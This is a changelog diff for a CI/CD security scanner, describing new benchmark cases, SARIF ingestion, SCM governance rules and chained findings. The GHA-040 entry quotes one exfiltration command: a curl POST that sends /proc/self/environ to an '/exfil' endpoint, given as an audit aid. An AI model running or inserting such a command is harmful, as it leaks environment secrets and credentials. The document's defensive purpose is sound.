@@ -12,6 +12,379 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
 
 ### Added
 
+- **Bench: SCM provider routing + 6th case (cross-provider with
+  SCM).** ``bench/run.py`` now detects ``scm_config.json`` +
+  ``scm/`` fixture directories per case and routes the SCM
+  provider via ``DiskSCMFetcher``, so cases that exercise the
+  GitHub-API-driven rules can run hermetically (no network, no
+  token). Fixture format mirrors ``--scm-fixture-dir``: JSON
+  files matching API endpoint paths with ``/`` collapsed to
+  ``_`` (e.g. ``repos_octocat_demo-app.json``); omitting an
+  endpoint's file means the fetcher returns ``None``, which
+  most rules treat as "feature not enabled" — same behavior as
+  a real 404.
+
+  New 6th case ``unprotected-mutable-image`` demonstrates the
+  end-to-end XPC-008 chain: a GitHub repo with no protection
+  rule on the default branch (SCM-001 fires because the SCM
+  fixture omits the protection JSON file) plus a Dockerfile
+  with a floating-tag ``FROM`` (DF-001). The chain engine
+  composes them into XPC-008 (unreviewed source ships mutable
+  runtime image), proving the SCM provider participates in
+  pipeline-check's correlation tier — not just the rule pack —
+  and that the bench surface exercises it end-to-end on a
+  hermetic fixture.
+
+  Recall: 100 % across all 6 cases (22 / 22 expected check_ids
+  fire). README updated with the SCM fixture format docs.
+
+- **Bench: chain-engine coverage + 5th case (cross-provider).**
+  ``bench/run.py`` now evaluates the chain engine on the union
+  of every per-provider scan, so chain check_ids
+  (``AC-NNN`` / ``XPC-NNN``) become first-class entries in
+  ``expected.txt``. Asserting a chain in a case proves that
+  case exercises pipeline-check's correlation tier (the
+  project's wedge), not just the rule pack.
+
+  Existing cases that naturally fire chains gained their
+  assertions:
+
+  * ``kubernetes-blast-radius`` adds ``AC-011`` (Kubernetes
+    Cluster Takeover via hostPath + cluster-admin).
+  * ``literal-credentials`` adds ``AC-005`` (Unsigned Artifact
+    to Production).
+
+  New 5th case ``cross-provider-floating-image`` demonstrates
+  ``XPC-002`` (tag mutability across build + runtime — DF-001
+  on a Dockerfile + K8S-001 on a Kubernetes manifest in the
+  same case). The composite is exactly the kind of finding
+  single-rule scanners can't surface.
+
+  Recall: 100% across all 5 cases (19 / 19 expected check_ids
+  fire). Catches a regression in either the rule pack OR the
+  chain engine.
+
+- **Vulnerable-by-design benchmark scaffold (`bench/`).** The
+  "single biggest credibility move available to a low-popularity
+  OSS scanner" the v0.4 review called out, now landed. Each case
+  under ``bench/cases/`` is a self-contained intentionally-
+  vulnerable repo slice anchored to a real attack pattern, with
+  a hand-curated ``expected.txt`` listing the check_ids
+  pipeline-check is asserted to fire on. ``bench/run.py``
+  iterates every case, runs the scanner via the in-process API
+  (no subprocess overhead), and prints a recall table.
+
+  Initial cases (4):
+
+  * ``unpinned-supply-chain`` — ``GHA-001`` (tag-pinned
+    actions) + ``DF-001`` (floating-tag image) + ``DF-002``
+    (root user). Anchored to the tj-actions/changed-files
+    CVE-2025-30066 March 2025 incident.
+  * ``pwn-request`` — ``GHA-002`` (pull_request_target +
+    PR-head checkout) + ``GHA-003`` (script injection) +
+    ``GHA-019`` (token persistence to artifact). Anchored to
+    the GitHub Security Lab "Preventing pwn requests" 2020
+    write-up.
+  * ``literal-credentials`` — ``GHA-008`` (AWS keys + GitHub
+    PAT pasted into env) + ``GHA-016`` (curl-pipe install
+    script). Anchored to Uber 2016 + GitGuardian Sprawl
+    reports.
+  * ``kubernetes-blast-radius`` — ``K8S-013`` (hostPath /) +
+    ``K8S-005`` (privileged container) + ``K8S-001`` /
+    ``K8S-006`` / ``K8S-007`` + ``K8S-020`` (cluster-admin
+    binding). Anchored to CVE-2021-25741 + TeamTNT / Kinsing
+    cluster-compromise reports.
+
+  Recall: 100% across all 4 cases (14 / 14 expected check IDs
+  fire). ``tests/test_bench.py`` runs the harness as a CI
+  regression gate so a rule that silently stops firing on a
+  case trips the suite.
+
+  ``bench/COMPARISON.md`` documents the eventual cross-scanner
+  matrix (vs Zizmor / Poutine / Checkov / KICS / Trivy) — not
+  shipped yet, but the case fixtures are designed to feed
+  directly into it once the comparison harness lands.
+
+- **XPC-009 cross-tool chain: ingested CVE finding plus mutable
+  runtime image reference.** First chain that fires on a SARIF-
+  ingested finding (from ``--ingest``) plus a native pipeline-
+  check finding. Triggers on any
+  ``INGEST-trivy-CVE-* / -trivy-AVD-* / -grype-CVE-* /
+  -snyk-SNYK-* / -snyk-CVE-* / -clair-CVE-* / -anchore-CVE-*``
+  finding paired with ``DF-001``. The composite is the
+  correlation play the ``--ingest`` flag was built around:
+  today's known vulnerability AND unbounded future-image
+  content. Demonstrates the strategic value of multi-scanner
+  ingestion — pipeline-check correlates findings the
+  individual tools wouldn't surface alone. New
+  ``failing_prefix()`` chain-engine helper supports prefix-
+  matched legs (one CVE finding can carry hundreds of distinct
+  rule IDs); reserved for ingested findings, native rules
+  continue to use exact-match ``failing()``. HIGH composite.
+  Catalog: 35 -> 36 chains.
+
+- **Multi-scanner SARIF ingest (`--ingest <file>`).** First-class
+  ingestion of external SARIF 2.1.0 documents from Trivy /
+  Checkov / Snyk / KICS / CodeQL / any conformant scanner.
+  External rules become ``Finding`` rows with synthesized
+  ``check_id`` of the form ``INGEST-<tool-slug>-<rule-id>``;
+  severity is read from ``properties.security-severity`` (the
+  GitHub-Code-Scanning CVSS-like 0..10 score) when present,
+  falling back to the SARIF ``level`` enum. Locations carry
+  through with file path + line numbers; the rule-definition
+  prose populates ``recommendation`` so the operator gets fix
+  guidance from the source tool inline.
+
+  After ingestion the chain engine RE-EVALUATES over the
+  union of (native + ingested) findings, so the existing
+  ``XPC-NNN`` chains can fire on cross-tool compositions —
+  e.g., a Checkov ``CKV_AWS_61`` finding plus pipeline-check's
+  ``DF-001`` becomes a richer composite than either tool would
+  surface alone. Repeat ``--ingest`` for multiple feeds; failures
+  to parse a file (malformed JSON, missing ``runs``, oversized
+  body) surface as warnings on stderr without crashing the scan.
+
+  Caps: 25 MiB per file, 5,000 results per file. Both
+  configurable via the public ``parse_sarif_file`` /
+  ``parse_sarif_text`` API surface in
+  ``pipeline_check.core.sarif_ingest``. Pure data, no network.
+
+  Closes the strategic Tier 2 gap nobody in the OSS space
+  currently fills: pipeline-check becomes the correlation tier
+  even where another tool owns primary detection. 33 unit tests
+  cover the parser contract; 5 CLI integration tests cover the
+  end-to-end flag behavior.
+
+- **XPC-008 cross-provider chain: unreviewed source ships a
+  mutable runtime image.** Fifth SCM-touching chain. Fires when
+  ``SCM-001`` (no branch protection rule) or ``SCM-007``
+  (force-pushes allowed) failure pairs with ``DF-001``
+  (Dockerfile ``FROM`` not digest-pinned) in the same
+  multi-provider scan. The composite extends the SCM provider's
+  reach beyond GHA-only chains: an insider can land a tampered
+  ``FROM`` reference change with no review gate AND every
+  subsequent build inherits whatever bytes the upstream registry
+  currently serves under that tag. Two unrelated trust
+  boundaries open at once with no compensating control to break
+  the chain at. HIGH composite. SCM provider doc updated to
+  list XPC-004..008. Catalog: 34 -> 35 chains.
+
+- **Proof-of-exploit backfill on three critical GHA rules.**
+  ``GHA-002`` (pwn-request), ``GHA-003`` (script injection), and
+  ``GHA-019`` (token persistence) now ship an ``exploit_example``
+  block. These three rules drive the XPC-004 / XPC-006 chain
+  narratives — backfilling them means a reviewer who hits
+  ``--explain`` on any of those chains sees the concrete attack
+  payload (PR-title-injection string, fork-PR Makefile bomb,
+  artifact-download exfil loop) inline rather than having to
+  reconstruct it from prose. ``GHA-002`` also gained
+  ``incident_refs`` citing the GitHub Security Lab pwn-request
+  write-up and the Trail of Bits Codecov-style follow-up. Three
+  new ``test_explain_renders_proof_of_exploit_for_*`` regression
+  tests assert each snippet survives the orchestrator backfill.
+
+- **GHA-040: known-compromised action ref detection (foundation
+  rule of the GHA-04x action-reputation pack).** Pure-data lookup
+  against a curated registry in
+  ``pipeline_check.core.checks.github._compromised_actions``: a
+  table of ``(owner/repo, malicious_ref_predicate, advisory)``
+  entries sourced from public CVEs / GHSAs. The rule walks every
+  workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references
+  and fires CRITICAL when any matches a known-compromised SHA or
+  tag. Initial registry covers tj-actions/changed-files
+  (CVE-2025-30066) and reviewdog/action-setup (CVE-2025-30154).
+
+  Distinct from GHA-001 (prevents the *vulnerability* — tag pin
+  instead of SHA pin) and GHA-025 (catches mass-renaming
+  primitives): GHA-040 catches the *active compromise*, when the
+  workflow is pinned to a specific ref a public advisory has
+  flagged. ``--explain GHA-040`` includes the
+  ``exploit_example`` showing both the compromised SHA pin and
+  the post-incident clean SHA the maintainer published, with the
+  exact attack payload (``curl -X POST .../exfil -d
+  "$(cat /proc/self/environ)"``) so the operator can audit logs
+  for the same shape.
+
+  Deliberately a pure-data lookup, no network access — refresh
+  is a manual code change reviewed through the normal PR flow.
+  Avoids taking on a telemetry / advisory-fetch surface that
+  would change the project's no-network-by-default posture.
+
+  Standards mappings: OWASP CICD-SEC-3, CIS SSCS 1.4.1 + 3.1.3,
+  OpenSSF Scorecard Pinned-Dependencies. CWE-829 + CWE-506.
+  GitHub provider catalog: 42 -> 43 rules. Foundation for
+  follow-up rules in the GHA-04x range (GHA-041 single-maintainer
+  action, GHA-042 very-young-repo action — both will require an
+  opt-in network fetcher path).
+
+- **XPC-007 cross-provider chain: unpinned actions with no
+  automated remediation.** Fourth SCM-touching chain. Fires when
+  ``GHA-001`` (workflow ``uses:`` references aren't SHA-pinned)
+  and ``SCM-005`` (Dependabot security updates disabled) both
+  fail in the same multi-provider scan. The composite spans the
+  full upstream-compromise lifecycle: GHA-001 is the immediate-
+  exposure primitive (a maintainer-account compromise propagates
+  to the next workflow run), SCM-005 is the absent-remediation
+  primitive (no automated PR opens when the public CVE drops).
+  The tj-actions/changed-files March 2025 incident
+  (CVE-2025-30066) is the canonical instance: tag-pinned
+  consumers got malicious code immediately, Dependabot-disabled
+  consumers had no in-flight PR to move them off it after the
+  advisory landed. SCM provider doc updated to list
+  XPC-004 / -005 / -006 / -007 in the cross-provider-chains
+  section. Catalog: 33 -> 34 chains.
+
+- **XPC-006 cross-provider chain: unreviewed fork-PR privilege
+  escalation.** Third SCM-touching chain. Fires when ``SCM-002``
+  (default branch protection does not require approving reviews)
+  and ``GHA-002`` (workflow uses ``pull_request_target`` and
+  checks out PR head — the canonical "pwn request" primitive)
+  both fail in the same multi-provider scan. The composite says:
+  there is no human-review gate either to *introduce* the
+  pwn-request primitive (one compromised maintainer adds it and
+  self-merges) or to *remove* it after detection (the same gate-
+  skip lets the malicious workflow stay). CRITICAL composite —
+  matches GHA-002's severity, escalated by the introduction-
+  without-review angle. Anchored to MITRE T1078.004 / T1199 /
+  T1195.002. SCM provider doc updated to list XPC-004 / XPC-005 /
+  XPC-006 in the cross-provider-chains section. Catalog: 32 -> 33
+  chains.
+
+- **SCM provider doc page (`docs/providers/scm.md`).** The
+  ``gen_provider_docs.py`` registry now includes the SCM provider,
+  so the auto-generated reference page renders alongside every
+  other provider's. Hand-written header documents the producer
+  workflow, the three FP-prevention guards (empty / archived /
+  meta-unavailable), the rule-family layout (presence rules,
+  review rules, security_and_analysis rules, signed-commits,
+  enforce-admins meta-rule), and the cross-provider chains the
+  SCM findings participate in (XPC-004, XPC-005). Wired into the
+  mkdocs nav and the providers/README.md card grid.
+
+- **XPC-005 cross-provider chain: end-to-end provenance gap.**
+  Second SCM-touching chain. Fires when ``SCM-006`` (default
+  branch protection does not require signed commits) and
+  ``GHA-006`` (workflow doesn't sign release artifacts) both fail
+  in the same multi-provider scan. The composite says: the
+  delivery pipeline lacks a cryptographic chain of custody at
+  either boundary; consumers can't verify what built from what,
+  every release is trust-on-first-use. SLSA Build L3 specifically
+  requires both legs to close. Catalog: 31 -> 32 chains.
+
+- **SCM provider FP/FN audit pass.** Walked every SCM-NNN rule
+  for the systemic false-positive / false-negative modes a
+  GitHub-API-driven posture scanner has to absorb:
+
+  * **Archived-repo guard.** GitHub auto-disables Dependabot,
+    secret scanning, secret-scanning push protection, code
+    scanning, and private vulnerability reporting on archived
+    repos. SCM-003 / SCM-004 / SCM-005 / SCM-015 / SCM-016 now
+    detect ``repo_meta.archived: true`` (and the sibling
+    ``disabled: true`` admin-suspension flag) and pass with a
+    ``Skipped: archived repo`` note instead of FPing on every
+    archived repo's failure-by-platform-default. Branch-protection
+    rules deliberately still evaluate on archived repos — the
+    audit-trail signal stays meaningful even when the repo is
+    read-only.
+  * **Empty-repo guard.** A brand-new repo with no commits has
+    no default branch, so the protection endpoint legitimately
+    404s. SCM-001 now detects ``repo_meta.size == 0`` plus
+    ``default_branch_protection is None`` and passes with an
+    ``Empty repo`` note. The 10 cascading branch-protection
+    rules already pass silently when SCM-001 has nothing to
+    evaluate.
+  * **Repo-metadata-unavailable guard.** When the
+    ``repos/{owner}/{repo}`` fetch itself fails (token without
+    read access, deleted repo, network failure), ``for_repo``
+    no longer probes ``branches/main/protection`` — the previous
+    behavior would FP on any repo whose default branch isn't
+    literally ``main``. SCM-001 surfaces a ``Repo metadata
+    unavailable`` finding so the gap is visible rather than
+    silent.
+  * **Documented FN modes.** SCM-002 and SCM-008 added
+    ``known_fp`` notes explaining the
+    ``bypass_pull_request_allowances`` and ``restrictions``
+    blocks the rules don't currently consult, so reviewers
+    auditing a passed finding know to spot-check the allowlists
+    in the GitHub UI.
+  * **Inventory enrichment.** ``--inventory`` output for SCM
+    repos now surfaces ``archived`` / ``disabled`` flags so
+    operators can correlate skipped findings with platform
+    state at glance.
+
+  New helpers in ``pipeline_check.core.checks.scm.base``:
+  ``is_archived``, ``is_disabled``, ``is_empty_repo``,
+  ``archived_state_label``. Six FP-regression test classes plus
+  six whole-pack integration sweeps lock the guard behavior.
+
+- **SCM provider fourth wave: review-time and disclosure controls.**
+  Six new rules, bringing the SCM rule pack from 10 to 16 and
+  filling out the CIS SSCS Source Code section beyond the
+  protection-knob set. ``SCM-011`` (CODEOWNERS reviews not
+  required, CIS 1.1.5 + Scorecard Code-Review), ``SCM-012``
+  (stale reviews not dismissed on new pushes, CWE-367
+  time-of-check / time-of-use class), ``SCM-013`` (conversation
+  resolution not required), ``SCM-014`` (most-recent-push
+  approval not required, blocks the two-account-collab review
+  bypass), ``SCM-015`` (secret-scanning push protection
+  disabled — the *prevent* step paired with SCM-004's *detect*),
+  ``SCM-016`` (private vulnerability reporting disabled —
+  structured maintainer-only disclosure channel).
+
+  Standards back-fill: SCM-011/012/013/014 map to OWASP
+  CICD-SEC-1, CIS 1.1.5, and OpenSSF Scorecard's Code-Review.
+  SCM-015 maps to OWASP CICD-SEC-6 + CIS 1.5.1. SCM-016 maps to
+  OWASP CICD-SEC-10 + CIS 1.4.1.
+
+- **XPC-004 cross-provider chain: token persistence on an
+  unprotected default branch.** First chain that composes an SCM
+  governance failure with a workflow credential-handling failure.
+  Fires when ``SCM-001`` (no branch protection rule) or ``SCM-007``
+  (force-pushes allowed) is failing alongside ``GHA-019`` (workflow
+  persists ``GITHUB_TOKEN`` or another secret into build output) in
+  the same multi-provider scan. Composite severity is CRITICAL: the
+  attacker primitive collapses from "compromise the build runtime"
+  to "open a PR, fetch the next build's artifacts." The chain
+  recommendation lists both fixes; either alone breaks it but
+  protection is the durable control. Catalog: 30 -> 31 chains.
+
+- **SCM posture provider third wave: branch-protection rounding-out.**
+  Two more rules covering the remaining branch-protection knobs:
+  ``SCM-009`` (default branch allows deletions, CIS 1.1.17 sibling
+  to SCM-007) and ``SCM-010`` (branch protection rule does not
+  enforce against administrators — every other knob becomes
+  advisory when admins can bypass). SCM-010 supports both the
+  modern nested ``{enabled: bool}`` and legacy bare-boolean shapes
+  of ``enforce_admins``. Standards back-fill: both new rules map
+  to ``cis_supply_chain``, ``openssf_scorecard`` (Branch-Protection)
+  and ``owasp_cicd_top_10``. SCM provider catalog: 8 -> 10 rules.
+
+- **SCM posture provider second wave: CIS SSCS Source Code coverage.**
+  Five new rules anchored to the CIS Software Supply Chain Security
+  Guide v1.0 Source Code section: ``SCM-004`` (secret scanning
+  disabled, CIS 1.5.1), ``SCM-005`` (Dependabot security updates
+  off, CIS 1.1.8), ``SCM-006`` (signed commits not required on the
+  default branch, CIS 1.1.6), ``SCM-007`` (default branch allows
+  force-pushes, CIS 1.1.17), ``SCM-008`` (no required status
+  checks on the default branch, CIS 1.1.5 + 1.1.7). SCM-004 and
+  SCM-005 read ``security_and_analysis.<feature>.status`` from the
+  repo metadata payload via a new ``security_feature_state``
+  helper; the ``known_fp`` block on each calls out the
+  token-without-admin-scope case so users can distinguish "really
+  disabled" from "I lacked visibility." SCM-002 and SCM-003
+  back-fill ``exploit_example`` for catalog consistency.
+
+  Standards back-fill: every SCM rule now maps to ``cis_supply_chain``
+  (with new Source Code controls 1.1.5 / 1.1.6 / 1.1.7 / 1.1.8 /
+  1.1.17 / 1.5.1 added to the controls dict) and to
+  ``openssf_scorecard``. The Scorecard module's docstring updates
+  to reflect that Branch-Protection is now evidenced (it was
+  previously listed as "outside this scanner's scope"); Code-Review
+  upgrades from "partially evidenced" to "evidenced"; SAST adds
+  the SCM-003 evidence path; Dependency-Update-Tool and
+  Vulnerabilities pick up SCM-005. SCM provider catalog: 3 -> 8
+  rules. Catalog total: 575 checks.
+
 - **SCM posture provider (`--pipeline scm`).** New provider that
   scans GitHub repository governance via the REST API: branch
   protection, required pull-request reviews, default code scanning,
